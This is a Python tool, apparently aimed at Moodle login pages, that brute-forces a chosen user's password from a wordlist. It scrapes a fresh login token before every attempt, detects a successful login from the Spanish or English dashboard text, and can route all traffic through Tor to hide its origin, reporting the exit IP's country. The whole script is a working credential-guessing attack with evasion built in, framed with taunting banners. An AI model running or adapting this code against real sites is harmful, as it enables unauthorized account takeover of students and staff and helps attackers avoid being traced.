######################################
# Title      :      moodless-cry                                                      #
# Author :                    Ele-vit                                                     #
#####################################

import requests
import re
import time
import sys
import os.path
import json
from bs4 import BeautifulSoup

banner = """        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢫⣽⣿⣿⣿⠹⣿⣟⢼⠛⠙⠛⢛⢽⣿⣽⣿⣿⣿⣿⣿⠙⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡐⣿⣿⣿⣿⠀⠉⠀⠈⠀⠀⠀⠀⠈⢈⠉⠀⣿⣿⣿⣿⢀⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⣿⣿⣿⣿⣾⣿⣍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⣤⣿⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠠⠰⢴⠴⠰⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠉⠉⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠙⢿⢹⣿⣿⢽⢽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠉⢻⣿⢿⠿⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠇⣿⣿⣿⣿⣿⣿⣿⣿⢄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⡠⠐⠒⠈⠈⠹⢸⣿⣿⣿⣿⣿⢸⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⠋⠈⠀⠐⠰⣀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣗⠒⠠⠀⠀⠀⠀⢀⠤⢺⣿⣿⣿⣿⣿⢀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⣸⠀⠀⠀⣴⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠈⠛⠒⠈⠀⠀⢸⣿⣿⣿⣿⣿⡄⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠉⠀⠀⠀⠁⠀⠈⠉⠉⠉⠉⠉⠉⠀⠀⠈⠈⠈⠈⠈⠈⠈⠉⠉⠉⠉⠉⠉⠀⠀⠉⠀⠀⠈⠀"""
print(banner)
oximoron = """  In a world of locked rooms, the man with the key is king.
        And, honey, you should see me in a crown. \n\n"""

for c in oximoron:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

found_one = """

                ⢰⡟⣡⡟⣱⣿⡿⠡⢛⣋⣥⣴⣌⢿⣿⣿⣿⣿⣷⣌⠻⢿⣿⣿⣿⣿⣿⣿
                ⠏⢼⡿⣰⡿⠿⠡⠿⠿⢯⣉⠿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣦⣍⠻⢿⣿⣿⣿
                ⣼⣷⢠⠀⠀⢠⣴⡖⠀⠀⠈⠻⣿⡿⣿⣿⣿⣿⣿⣛⣯⣝⣻⣿⣶⣿⣿⣿
                ⣿⡇⣿⡷⠂⠈⡉⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣍⡤⣤⣤⣤⡀⠀⠉⠛⠿
                ⣿⢸⣿⡅⣠⣬⣥⣤⣴⣴⣿⣿⢿⣿⣿⣿⣿⣿⣟⡭⡄⣀⣉⡀⠀⠀⠀⠀
                ⡟⣿⣿⢰⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣈⠀⠀⠀⢀⣶
                ⡧⣿⡇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣾⣿
                ⡇⣿⠃⣿⣿⣿⣿⣿⠛⠛⢫⣿⣿⣻⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿
                ⡇⣿⠘⡇⢻⣿⣿⣿⡆⠀⠀⠀⠀⠈⠉⠙⠻⠏⠛⠻⣿⣿⣿⣿⣿⣭⡾⢁⠀ I got it! """
found_two = """                ⡇⣿⠀⠘⢿⣿⣿⣿⣧⢠⣤⠀⡤⢀⣠⣀⣀⠀⠀⣼⣿⣿⣿⣿⣿⠟⣁⠉⠀ The password is """
found_three = """                ⣧⢻⠀⡄⠀⠹⣿⣿⣿⡸⣿⣾⡆⣿⣿⣿⠿⣡⣾⣿⣿⣿⣿⡿⠋⠐⢡⣶
                ⣿⡘⠈⣷⠀⠀⠈⠻⣿⣷⣎⠐⠿⢟⣋⣤⣾⣿⣿⣿⡿⠟⣩⠖⢠⡬⠈⠀
                ⣿⣧⠁⢻⡇⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⠿⠟⠋⠁⢀⠈⢀⡴⠈⠁⠀⠀
                ⠻⣿⣆⠘⣿⠀⠀⣀⡁⠀⠈⠙⠛⠋⠉⠀⠀⠀⠀⡀⠤⠚⠁⠄⣠"""


not_found ="""
                ⠄⣾⣿⡇⢸⣿⣿⣿⠄⠈⣿⣿⣿⣿⠈⣿⡇⢹⣿⣿⣿⡇⡇⢸⣿⣿⡇⣿⣿⣿
                ⢠⣿⣿⡇⢸⣿⣿⣿⡇⠄⢹⣿⣿⣿⡀⣿⣧⢸⣿⣿⣿⠁⡇⢸⣿⣿⠁⣿⣿⣿
                ⢸⣿⣿⡇⠸⣿⣿⣿⣿⡄⠈⢿⣿⣿⡇⢸⣿⡀⣿⣿⡿⠸⡇⣸⣿⣿⠄⣿⣿⣿
                ⢸⣿⡿⠷⠄⠿⠿⠿⠟⠓⠰⠘⠿⣿⣿⡈⣿⡇⢹⡟⠰⠦⠁⠈⠉⠋⠄⠻⢿⣿
                ⢨⡑⠶⡏⠛⠐⠋⠓⠲⠶⣭⣤⣴⣦⣭⣥⣮⣾⣬⣴⡮⠝⠒⠂⠂⠘⠉⠿⠖⣬
                ⠈⠉⠄⡀⠄⣀⣀⣀⣀⠈⢛⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⣀⣤⣤⣠⡀⠄⡀⠈⠁
                ⠄⠠⣾⡀⣾⣿⣧⣼⣿⡿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣧⣼⣿⣿⢀⣿⡇⠄
                ⡀⠄⠻⣷⡘⢿⣿⣿⡿⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⢿⣿⣿⡿⢃⣾⠟⢁⠈
                ⢃⢻⣶⣬⣿⣶⣬⣥⣶⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣷⣶⣶⣾⣿⣷⣾⣾⢣
                ⡄⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠘
                ⣿⡐⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢠⢃
                ⣿⣷⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢀⠆⣼
                ⣿⣿⣷⡀⠄⠈⠛⢿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⠿⠋⠠⠂⢀⣾⣿
                ⣿⣿⣿⣧⠄⠄⢵⢠⣈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⡁⢰⠏⠄⠄⣼⣿⣿
                ⢻⣿⣿⣿⡄⢢⠨⠄⣯⠄⠄⣌⣉⠛⠻⠟⠛⢋⣉⣤⠄⢸⡇⣨⣤⠄⢸⣿⣿⣿
"""


# It allows us to create a session with Tor
def get_tor_session():
    ses = requests.session()
    ses.proxies = {'http':  'socks5://127.0.0.1:9050',
                   'https': 'socks5://127.0.0.1:9050'}
    return ses

def boredom(use_tor):
    none = False
    # Here we define if we connect to the tor network or not
    if use_tor:
        ses = get_tor_session()
    else:
        ses = requests.Session()

    url = input("Target url: ")
    user_name = input("User: ")
    wordList = input("Password file: ")
    try:
        with open(wordList, "r") as passwords:
            for p in passwords:
                # Here we get a session allowing the token change on each request with its respective payload to be sent.
                r = ses.get(url)
                html = r.text.replace('method="POST"','method="post"')
                soup = BeautifulSoup(html, 'html.parser')
                url_form = soup.find('form', {'method':'post'}).get('action')
                token = soup.find('input', {'name':'logintoken'}).get('value')
                cookie = r.cookies.get_dict()
                passwd = p.replace("\n", "")
                payload = {'username': user_name, 'password': passwd, 'logintoken': token, 'anchor':''}
                fr = ses.post(url_form, cookies=cookie, data=payload)
                # In this way we identify the flag that will tell us if we log in correctly
                # language: spanish/english
                if 'Área personal' in fr.text or 'Dashboard' in fr.text :
                    print(found_one)
                    print(found_two+str(passwd))
                    print(found_three)
                    none = False
                    break
                else:
                    print('\rUser {} and Password {:>18}  <---- nope :c  '.format(user_name,passwd), end='')
                    none = True
    except KeyboardInterrupt:
        print("\n                               ok :C")
    except:
        if url == "":
            print("The url parameter is empty")
        if user_name == "":
            print("The user name parameter is empty")
        if wordList == "":
            print("Password list parameter is empty")
        if os.path.isfile(wordList) == False:
            print("Password path does not exist")
    finally:
        if none:
            print('\n\n'+not_found+'\n                           No matches\n')


# this function allows us to initialize our program and identify if we have an internet connection, to know if the tor service is up.
#We can also choose whether to use tor or not.
def start():
    try:
        use_tor = input("        Do you want to use the tor network? S/N: ")
        if use_tor.lower() == 's' or use_tor == '':
            ses = get_tor_session()
            request = ses.get("https://duckduckgo.com", timeout=5)
            ip = str(json.loads(ses.get("http://httpbin.org/ip").text)['origin'])
            dat_ip = ses.get("https://geolocation-db.com/json/"+ip+"&position=true").json()
            print("      ----------------- CIRCUIT TOR -----------------")
            print("                Ip      :    {}".format(str(dat_ip['IPv4'])))
            print("                Country :  {:>16}".format(dat_ip['country_name']))
            print("      ------------------------------------------------\n")
            boredom(True)
        else:
            boredom(False)
    except (requests.ConnectionError, requests.Timeout):
        print("        No internet connection or Tor service is down.")
    except KeyboardInterrupt:
        print("\n                               ok :C")

start()
